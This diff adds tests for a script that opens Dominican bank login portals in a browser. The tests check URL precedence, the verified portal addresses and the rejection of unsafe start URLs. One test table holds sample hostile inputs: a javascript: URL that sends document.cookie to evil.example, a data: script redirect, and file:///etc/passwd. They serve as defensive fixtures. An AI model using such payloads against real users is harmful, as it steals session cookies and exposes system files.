@@ -313,3 +313,97 @@ describeIfBash("launch-bank-browser.sh", () => {
     }
   });
 });
+
+describeIfBash("launch-bank-browser.sh start URL", () => {
+  it("prefers the per-bank start URL over the global one", async () => {
+    const sandbox = createSandbox();
+    try {
+      const result = runLauncher(
+        {
+          ...sandbox.env,
+          RD_SYNC_BANK_POPULAR_START_URL: "https://per-bank.example/login",
+          RD_SYNC_BANK_BROWSER_START_URL: "https://global.example/login",
+        },
+        "popular",
+      );
+
+      expect(result.status).toBe(0);
+      const argv = await readFileWhen(sandbox.logFile, (c) => c.includes("--new-window"));
+      expect(argv).toContain("--new-window https://per-bank.example/login");
+    } finally {
+      sandbox.cleanup();
+    }
+  });
+
+  it("prefers the global start URL over the verified portal URL", async () => {
+    const sandbox = createSandbox();
+    try {
+      const result = runLauncher(
+        { ...sandbox.env, RD_SYNC_BANK_BROWSER_START_URL: "https://global.example/login" },
+        "popular",
+      );
+
+      expect(result.status).toBe(0);
+      const argv = await readFileWhen(sandbox.logFile, (c) => c.includes("--new-window"));
+      expect(argv).toContain("--new-window https://global.example/login");
+    } finally {
+      sandbox.cleanup();
+    }
+  });
+
+  it.each([
+    ["popular", "https://ib.bpd.com.do"],
+    ["bhd_personal", "https://ibp.bhd.com.do/#/login"],
+  ])("opens %s at its verified portal URL", async (bankCode, expectedUrl) => {
+    const sandbox = createSandbox();
+    try {
+      const result = runLauncher(sandbox.env, bankCode);
+
+      expect(result.status).toBe(0);
+      const argv = await readFileWhen(sandbox.logFile, (c) => c.includes("--new-window"));
+      expect(argv).toContain(`--new-window ${expectedUrl}`);
+    } finally {
+      sandbox.cleanup();
+    }
+  });
+
+  it("opens a portal with no verified URL at about:blank, never at Popular's portal", async () => {
+    const sandbox = createSandbox();
+    try {
+      const result = runLauncher(sandbox.env, "banreservas_personas");
+
+      expect(result.status).toBe(0);
+      expect(result.stderr).toMatch(/no hay URL inicial verificada/);
+
+      const argv = await readFileWhen(sandbox.logFile, (c) => c.includes("--new-window"));
+      expect(argv).toContain("--new-window about:blank");
+      expect(argv).not.toContain("bpd.com.do");
+    } finally {
+      sandbox.cleanup();
+    }
+  });
+
+  it.each([
+    ["javascript:", "javascript:fetch('//evil.example/'+document.cookie)"],
+    ["data:", "data:text/html,<script>location='//evil.example'</script>"],
+    ["file:", "file:///etc/passwd"],
+    ["plain http", "http://ib.bpd.com.do"],
+    ["a scheme-relative URL", "//evil.example/login"],
+  ])("refuses a %s start URL instead of handing it to the browser", async (_label, startUrl) => {
+    const sandbox = createSandbox();
+    try {
+      const result = runLauncher(
+        { ...sandbox.env, RD_SYNC_BANK_POPULAR_START_URL: startUrl },
+        "popular",
+      );
+
+      expect(result.status).not.toBe(0);
+      expect(result.stderr).toMatch(/https:\/\/ o about:blank/);
+
+      const argv = await readFileWhen(sandbox.logFile, (c) => c.includes("--new-window"), 4);
+      expect(argv).not.toContain("--new-window");
+    } finally {
+      sandbox.cleanup();
+    }
+  });
+});
